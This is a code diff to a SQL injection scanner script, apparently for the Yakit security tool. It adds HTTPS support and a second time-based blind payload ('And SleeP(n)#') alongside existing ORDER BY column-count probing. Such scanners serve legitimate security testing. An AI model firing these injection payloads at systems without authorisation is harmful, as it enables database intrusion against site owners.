@@ -201,7 +201,7 @@ func heuristicCheckIfInjectable(url /* string */, req /* []byte */, isHttps /* b
 }
 
 func checkSqlInjection(pos /* int */, req /* []byte */, castDetected /* bool */, TEMPLATE_PAGE_RSP /* []byte */, CommonParams /* []*mutate.FuzzHTTPRequestParam */, isHttps) {
-    checkErrorBased(pos, req, castDetected, CommonParams)
+    checkErrorBased(pos, req, castDetected, CommonParams, isHttps)
     closeType, lineBreak := checkCloseType(pos, req, CommonParams, isHttps)
     if closeType == -1 {
         for index, param := range CommonParams {
@@ -216,14 +216,14 @@ func checkSqlInjection(pos /* int */, req /* []byte */, castDetected /* bool */,
     }
 
 
-    checkTimeBasedBlind(pos, req, CommonParams, closeType, lineBreak)
+    checkTimeBasedBlind(pos, req, CommonParams, closeType, lineBreak, isHttps)
     //checkBoolBased(pos, freq) //TODO:bool based
-    checkUnionBased(pos, req, TEMPLATE_PAGE_RSP, CommonParams, closeType, lineBreak)
+    checkUnionBased(pos, req, TEMPLATE_PAGE_RSP, CommonParams, closeType, lineBreak, isHttps)
     //checkStackedInjection
 }
 
-func checkErrorBased(pos /* int */, req /* []byte */, castDetected /* bool */, CommonParams /* []*mutate.FuzzHTTPRequestParam */) {
-    freq, _ := fuzz.HTTPRequest(req)
+func checkErrorBased(pos /* int */, req /* []byte */, castDetected /* bool */, CommonParams /* []*mutate.FuzzHTTPRequestParam */, isHttps /* bool */) {
+    freq, _ := fuzz.HTTPRequest(req, fuzz.https(isHttps))
     if castDetected {
         paramName := ""
         for index, param := range CommonParams {
@@ -440,11 +440,11 @@ func checkCloseType(pos /* int */, req /* []byte */, CommonParams /* []*mutate.F
 
 }
 
-func checkTimeBasedBlind(pos /* int */, req /* []byte */, CommonParams /* []*mutate.FuzzHTTPRequestParam */, closeType /* int */, lineBreak /* bool */) {
-    var payload
-    freq, _ := fuzz.HTTPRequest(req)
+func checkTimeBasedBlind(pos /* int */, req /* []byte */, CommonParams /* []*mutate.FuzzHTTPRequestParam */, closeType /* int */, lineBreak /* bool */, isHttps /* bool */) {
+    var payload, payload1
+    freq, _ := fuzz.HTTPRequest(req, fuzz.https(isHttps))
 
-    err, standardRespTime := getNormalRespondTime(req)
+    err, standardRespTime := getNormalRespondTime(req, isHttps)
     if err != nil {
         yakit_output(parseStr(err))//因获取响应时间出错 不再继续测试时间盲注
         return
@@ -454,8 +454,10 @@ func checkTimeBasedBlind(pos /* int */, req /* []byte */, CommonParams /* []*mut
     yakit_output("网站的正常响应时间应小于:" + parseStr(standardRespTime) + "ms")
     if lineBreak {
         payload = sprintf(`%v/**/And/**/SleeP(%v)-- `, ("\n" + CLOSE_TYPE[closeType]), standardRespTime * 2 / 1000 + 3)
+        payload1 = sprintf(`%v/**/And/**/SleeP(%v)#`, ("\n" + CLOSE_TYPE[closeType]), standardRespTime * 2 / 1000 + 3)
     } else {
         payload = sprintf(`%v/**/And/**/SleeP(%v)-- `, CLOSE_TYPE[closeType], standardRespTime * 2 / 1000 + 3)
+        payload1 = sprintf(`%v/**/And/**/SleeP(%v)#`, CLOSE_TYPE[closeType], standardRespTime * 2 / 1000 + 3)
     }
 
 
@@ -463,14 +465,25 @@ func checkTimeBasedBlind(pos /* int */, req /* []byte */, CommonParams /* []*mut
         if index == pos {
             yakit_output("尝试时间注入")
             payload = parseStr(param.Value()[0]) + payload
+            payload1 = parseStr(param.Value()[0]) + payload1
             result, err = param.Fuzz(payload).ExecFirst(fuzz.WithNamingContext("sql"), fuzz.WithConcurrentLimit(1),
                                                         fuzz.WithTimeOut(30))
             if err != nil {
                 yakit_output("尝试检测 Time-Based Blind SQL Injection Payload 失败")
                 return
             }
+            result1, err = param.Fuzz(payload1).ExecFirst(fuzz.WithNamingContext("sql"), fuzz.WithConcurrentLimit(1),
+                                                              fuzz.WithTimeOut(30))
+            if err != nil {
+                yakit_output("尝试检测 Time-Based Blind SQL Injection Payload 失败")
+                return
+            }
 
-
+            yakit_output(sprintf("网站对payload响应时间为 %v", result.ServerDurationMs))
+            yakit_output(sprintf("网站对payload1响应时间为 %v", result1.ServerDurationMs))
+            if result.ServerDurationMs <= standardRespTime + 2000 && result1.ServerDurationMs > standardRespTime + 2000{
+                result = result1
+            }
             if result.ServerDurationMs > standardRespTime + 2000 {
                 yakit_output(str.f(
                     "存在基于时间的 SQL 注入: [参数名:%v 原值:%v]",
@@ -513,13 +526,13 @@ func checkTimeBasedBlind(pos /* int */, req /* []byte */, CommonParams /* []*mut
 
 func checkBoolBased(pos /* int */, freq /* fuzzhttp */) {  }
 
-func checkUnionBased(pos /* int */, req /* []byte */, TEMPLATE_PAGE_RSP /* []byte */, CommonParams /* []*mutate.FuzzHTTPRequestParam */, closeType /* int */, lineBreak /* bool */) {
-    if guessColumnNum(pos, req, TEMPLATE_PAGE_RSP, CommonParams, closeType, lineBreak) != -1 {
+func checkUnionBased(pos /* int */, req /* []byte */, TEMPLATE_PAGE_RSP /* []byte */, CommonParams /* []*mutate.FuzzHTTPRequestParam */, closeType /* int */, lineBreak /* bool */, isHttps /* bool */) {
+    if guessColumnNum(pos, req, TEMPLATE_PAGE_RSP, CommonParams, closeType, lineBreak, isHttps) != -1 {
         return
     }
 
 
-    if bruteColumnNum(pos, req, TEMPLATE_PAGE_RSP, CommonParams, closeType, lineBreak) != -1 {
+    if bruteColumnNum(pos, req, TEMPLATE_PAGE_RSP, CommonParams, closeType, lineBreak, isHttps) != -1 {
         return
     }
 
@@ -527,24 +540,21 @@ func checkUnionBased(pos /* int */, req /* []byte */, TEMPLATE_PAGE_RSP /* []byt
     yakit_output("未检测到UNION联合注入")
 }
 
-func guessColumnNum(pos /* int */, req /* []byte */, TEMPLATE_PAGE_RSP /* []byte */, CommonParams /* []*mutate.FuzzHTTPRequestParam */, closeType /* int */, lineBreak /* bool */) {
+func guessColumnNum(pos /* int */, req /* []byte */, TEMPLATE_PAGE_RSP /* []byte */, CommonParams /* []*mutate.FuzzHTTPRequestParam */, closeType /* int */, lineBreak /* bool */, isHttps /* bool */) {
     var payload, result, columnNum
-    freq, _ := fuzz.HTTPRequest(req)
+    freq, _ := fuzz.HTTPRequest(req, fuzz.https(isHttps))
     ORDER_BY_STEP := 10
     ORDER_BY_MAX := 100
     lowCols, highCols = 1, ORDER_BY_STEP
     found = false
     DEFAULT_RATIO := -1
 
-    condition_1, DEFAULT_RATIO, _ = orderByTest(1, pos, req, TEMPLATE_PAGE_RSP, DEFAULT_RATIO, CommonParams, closeType,
-                                                lineBreak)
-    condition_2, DEFAULT_RATIO, _ = orderByTest(randn(9999, 999999), pos, req, TEMPLATE_PAGE_RSP, DEFAULT_RATIO,
-                                                CommonParams, closeType, lineBreak)
+    condition_1, DEFAULT_RATIO, _ = orderByTest(1, pos, req, TEMPLATE_PAGE_RSP, DEFAULT_RATIO, CommonParams, closeType, lineBreak, isHttps)
+    condition_2, DEFAULT_RATIO, _ = orderByTest(randn(9999, 999999), pos, req, TEMPLATE_PAGE_RSP, DEFAULT_RATIO,CommonParams, closeType, lineBreak, isHttps)
 
     if condition_1 && !condition_2 {
         for !found{
-            condition_volatile, DEFAULT_RATIO, _ = orderByTest(highCols, pos, req, TEMPLATE_PAGE_RSP, DEFAULT_RATIO,
-                                                               CommonParams, closeType, lineBreak)
+            condition_volatile, DEFAULT_RATIO, _ = orderByTest(highCols, pos, req, TEMPLATE_PAGE_RSP, DEFAULT_RATIO,CommonParams, closeType, lineBreak, isHttps)
             if condition_volatile {
                 lowCols = highCols
                 highCols += ORDER_BY_STEP
@@ -556,9 +566,7 @@ func guessColumnNum(pos /* int */, req /* []byte */, TEMPLATE_PAGE_RSP /* []byte
             } else {
                 for !found{
                     mid = highCols - math.Round((highCols - lowCols) / 2)
-                    condition_volatile_sec, DEFAULT_RATIO, result = orderByTest(mid, pos, req, TEMPLATE_PAGE_RSP,
-                                                                                DEFAULT_RATIO, CommonParams, closeType,
-                                                                                lineBreak)
+                    condition_volatile_sec, DEFAULT_RATIO, result = orderByTest(mid, pos, req, TEMPLATE_PAGE_RSP, DEFAULT_RATIO, CommonParams, closeType, lineBreak, isHttps)
                     if condition_volatile_sec {
                         lowCols = mid
                     } else {
@@ -620,9 +628,9 @@ func guessColumnNum(pos /* int */, req /* []byte */, TEMPLATE_PAGE_RSP /* []byte
     return -1
 }
 
-func orderByTest(number /* int */, pos /* int */, req /* []byte */, TEMPLATE_PAGE_RSP /* []byte */, DEFAULT_RATIO /* float */, CommonParams /* []*mutate.FuzzHTTPRequestParam */, closeType /* int */, lineBreak /* bool */) {
+func orderByTest(number /* int */, pos /* int */, req /* []byte */, TEMPLATE_PAGE_RSP /* []byte */, DEFAULT_RATIO /* float */, CommonParams /* []*mutate.FuzzHTTPRequestParam */, closeType /* int */, lineBreak /* bool */, isHttps/* bool */) {
     var payload
-    freq, _ := fuzz.HTTPRequest(req)
+    freq, _ := fuzz.HTTPRequest(req, fuzz.https(isHttps))
     for index, param := range CommonParams {
         if index == pos {
             if lineBreak {
@@ -635,7 +643,7 @@ func orderByTest(number /* int */, pos /* int */, req /* []byte */, TEMPLATE_PAG
             result, err = param.Fuzz(payload).ExecFirst(fuzz.WithNamingContext("sql"), fuzz.WithConcurrentLimit(1))
             if err != nil {
                 yakit_output("尝试检测 Order by 失败")
-                return false
+                return false, 0 , nil
             }
 
 
@@ -688,20 +696,20 @@ func comparison(result /* fuzzhttp */, TEMPLATE_PAGE_RSP /* []byte */, DEFAULT_R
     return false, DEFAULT_RATIO
 }
 
-func bruteColumnNum(pos /* int */, req /* []byte */, TEMPLATE_PAGE_RSP /* []byte */, CommonParams /* []*mutate.FuzzHTTPRequestParam */, closeType /* int */, lineBreak /* bool */) {
+func bruteColumnNum(pos /* int */, req /* []byte */, TEMPLATE_PAGE_RSP /* []byte */, CommonParams /* []*mutate.FuzzHTTPRequestParam */, closeType /* int */, lineBreak /* bool */, isHttps /* bool */) {
     var payload
     /* UPPER_COUNT - LOWER_COUNT *MUST* >= 5 */
     LOWER_COUNT = 1
     UPPER_COUNT = 15
 
-    err, standardRespTime := getNormalRespondTime(req)
+    err, standardRespTime := getNormalRespondTime(req, isHttps)
     if err != nil {
         yakit_output(parseStr(err))
         return
     }
 
 
-    freq, _ := fuzz.HTTPRequest(req)
+    freq, _ := fuzz.HTTPRequest(req, fuzz.https(isHttps))
 
     md5Randstr = randstr(5)
     md5CheckVal := codec.Md5(md5Randstr)
@@ -994,8 +1002,8 @@ func getErrorBasedPreCheckPayload() {
 }
 
 /* 对目标发起5次请求返回正常响应时间 */
-func getNormalRespondTime(req /* []byte */) {
-    freq, _ := fuzz.HTTPRequest(req)
+func getNormalRespondTime(req /* []byte */, isHttps /* bool */) {
+    freq, _ := fuzz.HTTPRequest(req, fuzz.https(isHttps))
     timeRec := []
     //yakit_output(parseString(len(freq.GetCommonParams())))
     //time.sleep(5)
